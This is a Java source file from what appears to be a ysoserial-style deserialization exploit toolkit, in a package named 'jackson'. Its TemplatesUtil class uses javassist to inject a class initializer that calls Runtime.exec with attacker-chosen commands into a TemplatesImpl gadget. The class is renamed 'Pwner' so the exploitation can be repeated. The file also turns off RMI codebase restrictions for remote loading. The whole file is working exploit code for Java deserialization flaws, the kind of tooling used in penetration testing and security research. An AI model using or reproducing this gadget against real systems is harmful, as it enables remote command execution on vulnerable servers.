/* MIT License
Copyright (c) 2017 Moritz Bechler
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

package jackson;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.CannotCompileException;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.text.StringEscapeUtils;
import ser05j.ClassFiles;
import ser05j.Reflections;

import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.util.Arrays;
import java.util.stream.Collectors;

/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({
    "restriction"
})
public class TemplatesUtil {

  static {
    // special case for using TemplatesImpl gadgets with a SecurityManager enabled
    System.setProperty(DESERIALIZE_TRANSLET, "true");

    // for RMI remote loading
    System.setProperty("java.rmi.server.useCodebaseOnly", "false");
  }

  public static class StubTransletPayload extends AbstractTranslet implements Serializable {

    private static final long serialVersionUID = -5971610431559700674L;


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {
    }


    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
  }

  // required to make TemplatesImpl happy
  public static class Foo implements Serializable {

    private static final long serialVersionUID = 8207363842866235160L;
  }


  public static Object createTemplatesImpl(final String[] args)
      throws ClassNotFoundException, IllegalAccessException, InstantiationException, IOException,
             CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException,
             InvocationTargetException {
    return createTemplatesImpl(
        args,
        Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
        Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
        Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
  }


  private static <T> T createTemplatesImpl(final String[] args, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
      throws NotFoundException, IllegalAccessException, InstantiationException,
      CannotCompileException, NoSuchFieldException, IOException, NoSuchMethodException, InvocationTargetException {
    final T templates = tplClass.getConstructor().newInstance();

    // use template gadget class
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    pool.insertClassPath(new ClassClassPath(abstTranslet));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());

    StringBuilder sb = new StringBuilder();
    boolean first = true;
    for (String arg : args) {

      if (!first) {
        sb.append(',');
      } else {
        first = false;
      }

      sb.append('"');
      sb.append(arg.replaceAll("\"", "\\\""));
      sb.append('"');
    }

    String cmdArgs = Arrays.stream(args)
        .map(StringEscapeUtils::escapeJava)
        .map(s -> "\"" + s + "\"")
        .collect(Collectors.joining(", "));

    String javaCode = "java.lang.Runtime.getRuntime().exec(new String[] { " + cmdArgs + " });";

    System.out.println("Java code: " + javaCode);

    clazz.makeClassInitializer().insertAfter(javaCode);
    // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);

    final byte[] classBytes = clazz.toBytecode();

    // inject class bytes into instance
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
        classBytes, ClassFiles.classAsBytes(Foo.class)
    });

    // required to make TemplatesImpl happy
    Reflections.setFieldValue(templates, "_name", "Pwnr");
    Reflections.setFieldValue(templates, "_tfactory", transFactory.getConstructor().newInstance());
    return templates;
  }
}